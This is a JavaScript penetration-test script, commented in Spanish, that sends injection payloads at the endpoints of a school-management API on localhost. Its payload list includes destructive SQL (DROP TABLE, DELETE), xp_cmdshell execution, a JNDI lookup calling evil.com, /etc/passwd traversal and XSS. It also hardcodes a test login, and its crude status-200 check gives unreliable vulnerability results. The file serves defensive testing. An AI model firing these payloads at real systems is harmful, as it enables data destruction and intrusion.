/**
 * 🔐 SCRIPT DE PRUEBAS DE PENETRACIÓN - INYECCIÓN SQL
 * Este script intenta explotar vulnerabilidades de inyección SQL
 * en todos los endpoints de la API TESCHA
 */

import axios from 'axios';

const API_URL = 'http://localhost:5000/api';
const TIMEOUT = 5000;

// Payloads comunes de inyección SQL
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",
  "1; DROP TABLE usuarios--",
  "' OR 'x'='x",
  "1' AND '1'='1",
  "'; EXEC xp_cmdshell('dir')--",
  "1' UNION SELECT password FROM usuarios--",
  "' OR username LIKE '%admin%'--",
  "1' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables--",
  "${jndi:ldap://evil.com/a}",
  "<!--",
  "<?xml version='1.0'?>",
  "../../../etc/passwd",
  "<script>alert('XSS')</script>",
  "'; DELETE FROM alumnos WHERE '1'='1",
  "1' OR SLEEP(5)--"
];

let vulnerabilidadesEncontradas = [];
let testsPasados = 0;
let testsFallados = 0;

// Colores para terminal
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

/**
 * Función para probar un endpoint con payloads maliciosos
 */
async function testEndpoint(method, endpoint, payloadLocation, token = null) {
  log(`\n🔍 Probando: ${method} ${endpoint}`, 'blue');
  
  for (const payload of SQL_INJECTION_PAYLOADS) {
    try {
      const config = {
        timeout: TIMEOUT,
        validateStatus: () => true // No rechazar por status code
      };
      
      if (token) {
        config.headers = { Authorization: `Bearer ${token}` };
      }
      
      let response;
      
      if (payloadLocation === 'params') {
        response = await axios[method](`${API_URL}${endpoint}/${payload}`, config);
      } else if (payloadLocation === 'query') {
        response = await axios[method](`${API_URL}${endpoint}`, { 
          params: { search: payload },
          ...config 
        });
      } else if (payloadLocation === 'body') {
        response = await axios[method](`${API_URL}${endpoint}`, 
          { nombre: payload, correo: `test${Date.now()}@test.com` },
          config
        );
      }
      
      // Detectar posibles vulnerabilidades
      const isVulnerable = 
        response.status === 200 ||
        (response.data && typeof response.data === 'object' && response.data.length > 0) ||
        (response.data && response.data.error && response.data.error.includes('syntax')) ||
        (response.data && response.data.error && response.data.error.includes('postgresql'));
      
      if (isVulnerable) {
        vulnerabilidadesEncontradas.push({
          endpoint: `${method.toUpperCase()} ${endpoint}`,
          payload,
          status: response.status,
          response: JSON.stringify(response.data).substring(0, 200)
        });
        log(`  ❌ VULNERABLE: Payload "${payload.substring(0, 30)}..." retornó status ${response.status}`, 'red');
        testsFallados++;
      } else {
        log(`  ✅ Protegido contra: "${payload.substring(0, 30)}..."`, 'green');
        testsPasados++;
      }
      
    } catch (error) {
      // Errores de timeout o conexión rechazada son esperados
      if (error.code === 'ECONNABORTED' || error.code === 'ECONNREFUSED') {
        log(`  ✅ Protegido (timeout/conexión rechazada)`, 'green');
        testsPasados++;
      } else {
        log(`  ⚠️  Error inesperado: ${error.message}`, 'yellow');
      }
    }
    
    // Delay para no saturar el servidor
    await new Promise(resolve => setTimeout(resolve, 100));
  }
}

/**
 * Obtener token de autenticación para pruebas
 */
async function getAuthToken() {
  try {
    const response = await axios.post(`${API_URL}/auth/login`, {
      username: 'coordinador',
      password: '1234'
    });
    return response.data.token;
  } catch (error) {
    log('⚠️  No se pudo obtener token. Las pruebas autenticadas se omitirán.', 'yellow');
    return null;
  }
}

/**
 * Ejecutar todas las pruebas
 */
async function runSecurityTests() {
  log('\n╔═══════════════════════════════════════════════════════════╗', 'magenta');
  log('║   🔐 PRUEBAS DE PENETRACIÓN - INYECCIÓN SQL - TESCHA    ║', 'magenta');
  log('╚═══════════════════════════════════════════════════════════╝', 'magenta');
  
  log('\n📋 Configuración:', 'blue');
  log(`   API URL: ${API_URL}`);
  log(`   Payloads a probar: ${SQL_INJECTION_PAYLOADS.length}`);
  log(`   Timeout: ${TIMEOUT}ms`);
  
  // Obtener token de autenticación
  log('\n🔑 Obteniendo token de autenticación...', 'blue');
  const token = await getAuthToken();
  
  if (token) {
    log('   ✅ Token obtenido exitosamente', 'green');
  }
  
  // ========== PRUEBAS EN ENDPOINTS PÚBLICOS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN ENDPOINTS PÚBLICOS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('post', '/auth/login', 'body');
  
  if (!token) {
    log('\n⚠️  No se puede continuar sin token. Deteniendo pruebas.', 'red');
    return;
  }
  
  // ========== PRUEBAS EN ALUMNOS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN MÓDULO DE ALUMNOS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('get', '/alumnos', 'query', token);
  await testEndpoint('get', '/alumnos', 'params', token);
  await testEndpoint('post', '/alumnos', 'body', token);
  await testEndpoint('put', '/alumnos', 'body', token);
  
  // ========== PRUEBAS EN MAESTROS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN MÓDULO DE MAESTROS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('get', '/maestros', 'query', token);
  await testEndpoint('post', '/maestros', 'body', token);
  await testEndpoint('put', '/maestros', 'body', token);
  
  // ========== PRUEBAS EN GRUPOS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN MÓDULO DE GRUPOS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('get', '/grupos', 'query', token);
  await testEndpoint('post', '/grupos', 'body', token);
  await testEndpoint('put', '/grupos', 'body', token);
  
  // ========== PRUEBAS EN PAGOS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN MÓDULO DE PAGOS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('get', '/pagos', 'query', token);
  await testEndpoint('post', '/pagos', 'body', token);
  
  // ========== PRUEBAS EN LIBROS ==========
  log('\n\n═══════════════════════════════════════', 'magenta');
  log('  PRUEBAS EN MÓDULO DE LIBROS', 'magenta');
  log('═══════════════════════════════════════', 'magenta');
  
  await testEndpoint('get', '/libros', 'query', token);
  await testEndpoint('post', '/libros', 'body', token);
  await testEndpoint('put', '/libros', 'body', token);
  
  // ========== REPORTE FINAL ==========
  log('\n\n╔═══════════════════════════════════════════════════════════╗', 'magenta');
  log('║                    📊 REPORTE FINAL                       ║', 'magenta');
  log('╚═══════════════════════════════════════════════════════════╝', 'magenta');
  
  log(`\n✅ Tests Pasados: ${testsPasados}`, 'green');
  log(`❌ Tests Fallados: ${testsFallados}`, 'red');
  log(`📊 Total de Tests: ${testsPasados + testsFallados}`);
  
  const porcentajeSeguridad = ((testsPasados / (testsPasados + testsFallados)) * 100).toFixed(2);
  log(`\n🛡️  Nivel de Seguridad: ${porcentajeSeguridad}%`, porcentajeSeguridad >= 95 ? 'green' : 'yellow');
  
  if (vulnerabilidadesEncontradas.length > 0) {
    log('\n\n⚠️  VULNERABILIDADES DETECTADAS:', 'red');
    vulnerabilidadesEncontradas.forEach((vuln, idx) => {
      log(`\n${idx + 1}. ${vuln.endpoint}`, 'red');
      log(`   Payload: ${vuln.payload}`, 'yellow');
      log(`   Status: ${vuln.status}`, 'yellow');
      log(`   Response: ${vuln.response}`, 'yellow');
    });
  } else {
    log('\n\n🎉 ¡NO SE ENCONTRARON VULNERABILIDADES!', 'green');
    log('   El sistema está protegido contra inyección SQL', 'green');
  }
  
  log('\n═══════════════════════════════════════════════════════════\n', 'magenta');
}

// Ejecutar pruebas
runSecurityTests().catch(error => {
  log(`\n❌ Error fatal en las pruebas: ${error.message}`, 'red');
  process.exit(1);
});
